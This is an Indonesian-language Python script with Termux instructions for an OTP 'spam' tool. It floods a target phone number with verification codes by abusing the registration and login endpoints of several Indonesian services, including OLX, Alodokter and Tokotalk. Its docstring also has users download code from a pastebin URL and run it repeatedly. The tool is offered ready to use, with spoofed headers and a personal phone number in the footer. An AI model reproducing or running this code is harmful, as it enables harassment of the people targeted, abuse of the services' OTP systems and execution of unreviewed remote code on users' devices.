
'''
• CARA MEMBUAT SCRIPT SPAMNYA •

- Buka Termux Lalu Ketik

nano contoh.py

- Kemudian Enter

import os,requests
os.system('clear')
print ('MASUKAN NOMOR DENGAN AWALAN 8XXX')
no = input ('MASUKAN NOMOR TARGET : ')
jum = int(input('MASUKAN JUMLAH SPAM  : '))
for i in range(jum):
        req = requests.get('https://pastebin.com/raw/fMAZw2pE').text
        open ('head.py','w').write('no = "%s" \n %s'%(int(no),req))
        os.system('python head.py')

- Copy Teks di atas lalu tempel di termux
- Setelah itu pencet
 ctrl
 x
 y
- Lalu Enter
- Jalankan scriptnya dengan cara ketik
python contoh.py

Trus masukan nomer target yg mau di spam menggunakan awalan 8xxx lalu enter
Trus masukan jumlah spamnya lalu enter

Dah Jadi tinggal tunggu prosesnya ^_^
'''
import os,requests,json,random
ua = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
req = requests.Session()
try:
	head = {
	"Host": "api-dash.olsera.co.id",
	"content-length": "122",
	"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
	"accept": "application/json, text/plain, */*",
	"content-type": "application/json",
	"sec-ch-ua-mobile": "?1",
	"user-agent": ua,
	'sec-ch-ua-platform': "Android",
	"origin": "https://www.olsera.com",
	"sec-fetch-site": "cross-site",
	"sec-fetch-mode": "cors",
	"sec-fetch-dest": "empty",
	"referer": "https://www.olsera.com/",
	"accept-encoding": "gzip, deflate, br",
	"accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"}

	data = json.dumps({"name":"Xenz","email":"xenz021104@gmail.com","phone":"+62"+no,"password":"xenzganz","i_agree":"true","use_otp_type":3})
	requests.post('https://api-dash.olsera.co.id/api/admin/v1/id/register',data=data,headers=head).text

	data = json.dumps({"phoneNumber":"+62"+no,"platform":"wa"})
	requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"content-type": "application/json","user-agent":ua},data=data).text
except:
	pass


try:
	head = {
	"Host": "api.tokko.io",
	"content-length": "306",
	"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
	"accept-language": "id",
	"sec-ch-ua-mobile": "?1",
	"user-agent": ua,
	"x-tokko-api-client": "merchant_web",
	"content-type": "application/json",
	"accept": "*/*",
	"x-tokko-api-client-version": "4.4.0",
	"sec-ch-ua-platform": "Android",
	"origin": "https://web.lummoshop.com",
	"sec-fetch-site": "cross-site",
	"sec-fetch-mode": "cors",
	"sec-fetch-dest": "empty",
	"referer": "https://web.lummoshop.com/",
	"accept-encoding": "gzip, deflate, br"}

	data = ({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+no,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {generateOtp(generateOtpInput:$generateOtpInput) {phoneNumber}}"})
	requests.post("https://api.tokko.io/graphql",headers=head,json=data).text
except:
	pass

try:
	head = {
	"Host": "www.olx.co.id",
	"content-length": "62",
	"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
	"x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
	"sec-ch-ua-mobile": "?1",
	"x-panamera-fingerprint": "950261aa4825ef04ca2811f8e8e0f2ed#1655354730549",
	"user-agent": ua,
	"content-type": "application/json",
	"accept": "*/*",
	"sec-ch-ua-platform": "Android",
	"origin": "https://www.olx.co.id",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "cors",
	"sec-fetch-dest": "empty",
	"referer": "https://www.olx.co.id/",
	"accept-encoding": "gzip, deflate, br",
	"accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"}

	data = ({"grantType":"phone","phone":"+62"+no,"language":"id"})
	requests.post('https://www.olx.co.id/api/auth/authenticate',headers=head,json=data)
except:
	pass

try:
	head = {
	"Host": "tokotalk-api.eks.codebrick.io",
	"Connection": "keep-alive",
	"Content-Length": "110",
	"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
	"Accept": "application/json, text/plain, */*",
	"Content-Type": "application/json;charset=UTF-8",
	"sec-ch-ua-mobile": "?1",
	"User-Agent": ua,
	"sec-ch-ua-platform": "Android",
	"Origin": "https://tokoadmin.tokotalk.com",
	"Sec-Fetch-Site": "cross-site",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-Dest": "empty",
	"Referer": "https://tokoadmin.tokotalk.com/",
	"Accept-Encoding": "gzip, deflate, br",
	"Accept-Language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"}

	data = ({"optional":"66a66de41820224c49920098c78482de","key":"phone","preferredMethod":"wa","value":"+62"+no})
	requests.post('https://tokotalk-api.eks.codebrick.io/v1/no_auth/verifications',headers=head,json=data)
except:
	pass

try:
	head = {
	"Host": "tokotalk-api.eks.codebrick.io",
	"Connection": "keep-alive",
	"Content-Length": "110",
	"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
	"Accept": "application/json, text/plain, */*",
	"Content-Type": "application/json;charset=UTF-8",
	"sec-ch-ua-mobile": "?1",
	"User-Agent": ua,
	"sec-ch-ua-platform": "Android",
	"Origin": "https://tokoadmin.tokotalk.com",
	"Sec-Fetch-Site": "cross-site",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-Dest": "empty",
	"Referer": "https://tokoadmin.tokotalk.com/",
	"Accept-Encoding": "gzip, deflate, br",
	"Accept-Language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"}

	data = ({"optional":"66a66de41820224c49920098c78482de","key":"phone","preferredMethod":"wa","value":"+62"+no})
	requests.post('https://tokotalk-api.eks.codebrick.io/v1/no_auth/verifications',headers=head,json=data)
except:
	pass

try:
	head = {
	"Host": "www.alodokter.com",
	"content-length": "33",
	"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
	"accept": "application/json",
	"content-type": "application/json",
	"x-csrf-token": "39WajKwmIc7PSYUqAgbXjvATDy8og+ZRiIko6rJsJrIWB2gkU0tGfg1fNH3EQCYUxFqf8SaZbSBzYbMCirEsEw==",
	"sec-ch-ua-mobile": "?1",
	"user-agent": ua,
	"sec-ch-ua-platform": "Android",
	"origin": "https://www.alodokter.com",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "cors",
	"sec-fetch-dest": "empty",
	"referer": "https://www.alodokter.com/login-alodokter",
	"accept-encoding": "gzip, deflate, br",
	"accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"}

	data = ({"user":{"phone":"0"+no}})
	req.post('https://www.alodokter.com/login-with-phone-number',headers=head,json=data)
except:
	pass
#===============================================#
#              CREATED BY XENZ			#
#===============================================#

#===============================================#
#						#
#   https://github.com/Xenz-11			#
#   https://wa.me/6283138623993			#
#   https://facebook.com/inu.pembangkang.7	#
#   https://instagram.com/xenz_ganz		#
#						#
#===============================================#
